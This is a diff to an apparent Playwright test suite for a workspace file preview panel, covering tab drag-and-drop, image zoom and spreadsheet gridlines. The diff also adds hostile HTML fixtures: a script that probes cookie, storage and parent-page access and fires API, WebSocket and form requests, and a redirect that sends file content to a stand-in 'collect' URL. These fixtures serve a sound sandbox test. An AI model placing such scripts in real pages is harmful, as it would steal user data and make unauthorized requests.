@@ -102,7 +102,8 @@ fs.writeFileSync(path.join(folder, "report.docx"), await smallDocx());
 	sheet.getCell("B2").numFmt = '"$"#,##0.00';
 	sheet.mergeCells("A3:B3");
 	sheet.getCell("A3").value = "Invented merge";
-	workbook.addWorksheet("Real detail").getCell("A1").value = "Second sheet";
+	const detail = workbook.addWorksheet("Real detail", { views: [{ showGridLines: false }] });
+	detail.getCell("A1").value = "Second sheet";
 	fs.writeFileSync(path.join(folder, "actual.xlsx"), Buffer.from(await workbook.xlsx.writeBuffer()));
 }
 fs.writeFileSync(path.join(folder, "sample.xlsx"), "invented placeholder");
@@ -126,6 +127,20 @@ fs.writeFileSync(path.join(folder, "old.doc"), "legacy");
 fs.writeFileSync(path.join(folder, "old.xls"), "invented old workbook");
 fs.writeFileSync(path.join(folder, "macro.xlsm"), "invented macro workbook");
 fs.writeFileSync(path.join(folder, "plain.txt"), "plain");
+fs.writeFileSync(path.join(folder, "hostile.html"), `<!doctype html><body><script>
+const results = [];
+for (const [name, fn] of [["cookie", () => document.cookie], ["storage", () => localStorage.getItem("invented")], ["parent", () => parent.document.body.innerText]]) {
+  try { fn(); results.push(name + ":accessible"); } catch { results.push(name + ":blocked"); }
+}
+fetch("/healthz?hostile-fetch").catch(() => {});
+fetch("/api/remote/enable?hostile-api", { method: "POST" }).catch(() => {});
+try { const xhr = new XMLHttpRequest(); xhr.open("GET", "/healthz?hostile-xhr"); xhr.send(); } catch {}
+try { new WebSocket("ws://127.0.0.1:${port}/hostile-ws"); } catch {}
+const image = new Image(); image.src = "/healthz?hostile-image"; document.body.append(image);
+const form = document.createElement("form"); form.method = "POST"; form.action = "/healthz?hostile-form"; document.body.append(form); form.submit();
+document.body.dataset.result = results.join(",");
+</script></body>`);
+fs.writeFileSync(path.join(folder, "navigation.html"), `<script>location.href = "https://example.invalid/collect?data=invented-file-content"</script>`);
 const observedFiles = ["photo.png", "report.pdf", "report.docx", "sample.xlsx", "large.svg", "notes.md"];
 const digest = (name: string) => createHash("sha256").update(fs.readFileSync(path.join(folder, name))).digest("hex");
 const originalDigests = new Map(observedFiles.map((name) => [name, digest(name)]));
@@ -213,6 +228,30 @@ try {
 			if (request.url().includes("/workspace-image?")) imageRequests += 1;
 			if (request.url().includes("/workspace-preview?")) previewRequests += 1;
 		});
+        const forbiddenRequests: string[] = [];
+        context.on("requestfinished", request => { if (/hostile-(fetch|api|xhr|ws|image|form)/.test(request.url())) forbiddenRequests.push(request.url()); });
+        await treeFile("hostile.html").click();
+        const hostileFrame = page.frameLocator(".workspace-preview-html iframe");
+        await hostileFrame.locator("body[data-result]").waitFor();
+        assert(await hostileFrame.locator("body").getAttribute("data-result") === "cookie:blocked,storage:blocked,parent:blocked", "embedded HTML runs scripts with opaque origin");
+        const htmlFrame = page.locator(".workspace-preview-html iframe");
+        const directUrl = new URL((await htmlFrame.getAttribute("src"))!, baseUrl).href;
+        const direct = await context.newPage();
+        await direct.goto(directUrl);
+        await direct.locator("body[data-result]").waitFor();
+        const directResult = await direct.locator("body").getAttribute("data-result");
+        assert(directResult?.startsWith("cookie:blocked,storage:blocked"), "direct HTML retains opaque origin");
+        await direct.waitForTimeout(300);
+        assert(forbiddenRequests.length === 0 && !/hostile-(fetch|api|xhr|ws|image|form)/.test(serverOutput.join("")), "HTML cannot send API, connect, image or form requests");
+        let navigation = "";
+        await context.route("https://example.invalid/**", async route => { navigation = route.request().url(); await route.abort(); });
+        const navUrl = directUrl.replace("path=hostile.html", "path=navigation.html");
+        await direct.goto(navUrl).catch(() => {});
+        await waitUntil(() => Promise.resolve(navigation.includes("invented-file-content")), "intercepted self-navigation");
+        await direct.close();
+        await context.unroute("https://example.invalid/**");
+        await tab("hostile.html").locator(".workspace-tab-close").click();
+        previewRequests = 0;
 		await treeFile("notes.md").click();
 		await page.locator(".markdown-editor-tiptap .ProseMirror").waitFor({ timeout: 20_000 });
 		await treeFile("photo.png").click();
@@ -254,6 +293,32 @@ try {
 		const editor = page.locator(".markdown-editor-tiptap .ProseMirror");
 		await editor.click();
 		await page.keyboard.type(" new draft");
+		const dragTab = async (source: string, x: number, y: number) => {
+			const box = (await tab(source).boundingBox())!;
+			await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
+			await page.mouse.down();
+			await page.mouse.move(x, y, { steps: 12 });
+			await page.mouse.move(x, y);
+			await page.mouse.up();
+		};
+		let targetBox = (await tab("notes.md").boundingBox())!;
+		await dragTab("photo.png", targetBox.x + 3, targetBox.y + targetBox.height / 2);
+		assert(JSON.stringify(await tabNames()) === JSON.stringify(["photo.png", "notes.md"]), "dragging before a tab reorders it");
+		targetBox = (await tab("notes.md").boundingBox())!;
+		await dragTab("photo.png", targetBox.x + targetBox.width - 3, targetBox.y + targetBox.height / 2);
+		assert(JSON.stringify(await tabNames()) === JSON.stringify(["notes.md", "photo.png"]), "dragging after a tab reorders it");
+		const bar = (await page.locator(".workspace-tabs").boundingBox())!;
+		await dragTab("notes.md", bar.x + bar.width - 3, bar.y + bar.height / 2);
+		assert(JSON.stringify(await tabNames()) === JSON.stringify(["photo.png", "notes.md"]), "dragging past the last tab moves it to the end");
+		targetBox = (await tab("notes.md").boundingBox())!;
+		await dragTab("notes.md", targetBox.x + targetBox.width / 2, targetBox.y + targetBox.height / 2);
+		assert(JSON.stringify(await tabNames()) === JSON.stringify(["photo.png", "notes.md"]), "dropping a tab on itself changes nothing");
+		const composer = page.locator(".composer-box");
+		const composerBefore = await composer.innerText();
+		const composerBox = (await composer.boundingBox())!;
+		await dragTab("photo.png", composerBox.x + composerBox.width / 2, composerBox.y + composerBox.height / 2);
+		assert(await composer.innerText() === composerBefore && JSON.stringify(await tabNames()) === JSON.stringify(["photo.png", "notes.md"]), "a tab dropped on the composer inserts nothing");
+		assert((await editor.textContent())?.includes("new draft") && (await activeName()) === "notes.md", "reordering preserves the open unsaved Markdown draft");
 		await treeFile("photo.png").click();
 		const prompt = page.getByRole("dialog", { name: "Unsaved Markdown changes" });
 		await prompt.waitFor();
@@ -384,6 +449,51 @@ try {
 		const imageBounds = await svg.boundingBox();
 		const paneBounds = await page.locator(".workspace-pane").boundingBox();
 		assert(imageBounds && paneBounds && imageBounds.width <= paneBounds.width && imageBounds.height <= paneBounds.height, "a large image fits its pane");
+		await treeFile("notes.md").click();
+		await tab("large.svg").locator(".workspace-tab-select").click();
+		const shownBounds = await svg.boundingBox();
+		assert(shownBounds && shownBounds.width > 0 && shownBounds.width <= paneBounds.width && shownBounds.height <= paneBounds.height, "a hidden image tab fits when shown");
+		await page.emulateMedia({ reducedMotion: "reduce" });
+		const stage = page.locator(".workspace-preview-image:visible");
+		const zoomLabel = page.locator(".workspace-preview-image-tools:visible span");
+		await page.getByRole("button", { name: "100%", exact: true }).click();
+		await waitUntil(async () => (await zoomLabel.textContent()) === "100%", "100% zoom button");
+		const stageBox = (await stage.boundingBox())!;
+		const anchor = { x: stageBox.x + stageBox.width * 0.6, y: stageBox.y + stageBox.height * 0.6 };
+		const wheelAt = async (deltaY: number, ctrlKey = false) => {
+			await stage.evaluate((element, args) => element.dispatchEvent(new WheelEvent("wheel", { bubbles: true, cancelable: true, clientX: args.x, clientY: args.y, deltaY: args.deltaY, ctrlKey: args.ctrlKey })), { ...anchor, deltaY, ctrlKey });
+		};
+		for (const pinch of [false, true]) {
+			const before = (await svg.boundingBox())!;
+			const point = { x: (anchor.x - before.x) / before.width, y: (anchor.y - before.y) / before.height };
+			await wheelAt(-50, pinch);
+			await waitUntil(async () => (await svg.boundingBox())!.width > before.width + 1, pinch ? "pinch zoom" : "wheel zoom");
+			const after = (await svg.boundingBox())!;
+			assert(Math.abs(after.x + point.x * after.width - anchor.x) < 1 && Math.abs(after.y + point.y * after.height - anchor.y) < 1, `${pinch ? "pinch" : "wheel"} keeps the image point under the pointer`);
+		}
+		await wheelAt(-100000);
+		await waitUntil(async () => (await zoomLabel.textContent()) === "3200%", "maximum zoom");
+		await wheelAt(100000);
+		await waitUntil(async () => (await zoomLabel.textContent()) === "2%", "minimum zoom");
+		await page.getByRole("button", { name: "100%", exact: true }).click();
+		await waitUntil(async () => (await zoomLabel.textContent()) === "100%", "restore zoom");
+		await page.mouse.move(anchor.x, anchor.y);
+		await page.mouse.down();
+		await page.mouse.move(anchor.x + 1800, anchor.y + 1800, { steps: 5 });
+		await page.mouse.up();
+		const dragged = (await svg.boundingBox())!;
+		assert(dragged.x <= stageBox.x + 1 && dragged.y <= stageBox.y + 1 && dragged.x + dragged.width >= stageBox.x + stageBox.width - 1 && dragged.y + dragged.height >= stageBox.y + stageBox.height - 1, "dragging cannot expose a gap");
+		await page.getByRole("button", { name: "Zoom in" }).click();
+		await waitUntil(async () => (await zoomLabel.textContent()) === "125%", "zoom in button");
+		await page.getByRole("button", { name: "Zoom out" }).click();
+		await waitUntil(async () => (await zoomLabel.textContent()) === "100%", "zoom out button");
+		await page.getByRole("button", { name: "Fit", exact: true }).click();
+		const fitPercent = await zoomLabel.textContent();
+		await stage.dblclick();
+		await waitUntil(async () => (await zoomLabel.textContent()) === "100%", "double click zooms in");
+		await stage.dblclick();
+		await waitUntil(async () => (await zoomLabel.textContent()) === fitPercent, "double click fits again");
+		await page.emulateMedia({ reducedMotion: "no-preference" });
 		await tab("large.svg").locator(".workspace-tab-close").click();
 		await treeFile("old.doc").click();
 		await page.getByText("Save this old .doc file as .docx to preview it here.", { exact: true }).waitFor();
@@ -441,10 +551,12 @@ try {
 		await realCell.waitFor({ timeout: 10_000 });
 		const realStyle = await realCell.evaluate((node) => ({ color: getComputedStyle(node).color, weight: getComputedStyle(node).fontWeight, fill: getComputedStyle(node).backgroundColor }));
 		assert(realStyle.color === "rgb(204, 34, 0)" && Number(realStyle.weight) >= 700 && realStyle.fill === "rgb(255, 255, 0)", "the real workbook displays its font and fill");
+		assert(await realCell.evaluate((node) => getComputedStyle(node).borderRightColor) === "rgb(255, 255, 0)", "the filled cell hides its own gridline with its fill");
 		assert(await page.getByText("$54.00", { exact: true }).count() === 1, "the real workbook displays the cached formatted result");
 		assert(await page.getByText("Invented merge", { exact: true }).getAttribute("colspan") === "2", "the real workbook displays its merged range");
 		await page.getByRole("button", { name: "Real detail", exact: true }).click();
 		await page.getByText("Second sheet", { exact: true }).waitFor();
+		assert(await page.getByText("Second sheet", { exact: true }).evaluate((node) => getComputedStyle(node).borderRightColor) === "rgba(0, 0, 0, 0)", "a sheet that hides gridlines renders transparent cell borders");
 		await assertPreviewHasNoEditingControls();
 		await tab("actual.xlsx").locator(".workspace-tab-close").click();
 		let corruptWorkbook = false;
@@ -455,7 +567,7 @@ try {
 			const font = { family: "Arial", sizePt: 11, color: "#CC2200", bold: true, italic: false, underline: "none", strike: false };
 			const style = { fill: "#FFFF00", font, borders: { top: { style: "thin", color: "#000000" }, right: null, bottom: null, left: null }, align: { horizontal: "left", vertical: "bottom", wrap: false } };
 			const otherStyle = { ...style, font: { ...font, color: "#0044CC", italic: true } };
-			const sheet = (id: string, name: string, text: string, wide = false) => ({ id, name, visibility: "visible", rowCount: wide ? 80 : 1, columnCount: wide ? 12 : 1, defaultRowHeightPx: 20, defaultColumnWidthPx: 64, rows: [], columns: [{ index: 1, widthPx: 173 }], cells: [{ row: 1, column: 1, text, style: 0, runs: wide ? [{ text: "Invented ", style: 0 }, { text: "total", style: 1 }] : null, valueKind: "text" }, ...(wide ? [{ row: 2, column: 2, text: "—", style: 0, runs: null, valueKind: "formula-result-unavailable" }, { row: 3, column: 3, text: "Merged cell", style: 0, runs: null, valueKind: "text" }, { row: 80, column: 12, text: "Last cell", style: 0, runs: null, valueKind: "text" }] : [])], merges: wide ? [{ top: 3, left: 3, bottom: 4, right: 4 }] : [] });
+			const sheet = (id: string, name: string, text: string, wide = false) => ({ id, name, visibility: "visible", showGridLines: true, rowCount: wide ? 80 : 1, columnCount: wide ? 12 : 1, defaultRowHeightPx: 20, defaultColumnWidthPx: 64, rows: [], columns: [{ index: 1, widthPx: 173 }], cells: [{ row: 1, column: 1, text, style: 0, runs: wide ? [{ text: "Invented ", style: 0 }, { text: "total", style: 1 }] : null, valueKind: "text" }, ...(wide ? [{ row: 2, column: 2, text: "—", style: 0, runs: null, valueKind: "formula-result-unavailable" }, { row: 3, column: 3, text: "Merged cell", style: 0, runs: null, valueKind: "text" }, { row: 80, column: 12, text: "Last cell", style: 0, runs: null, valueKind: "text" }] : [])], merges: wide ? [{ top: 3, left: 3, bottom: 4, right: 4 }] : [] });
 			const summary = sheet("1", "Summary", "Invented total", true);
 			if (corruptWorkbook) summary.cells[0].style = 77;
 			const empty = { ...sheet("3", "Empty", ""), visibility: "hidden", rowCount: 0, columnCount: 0, columns: [], cells: [] };
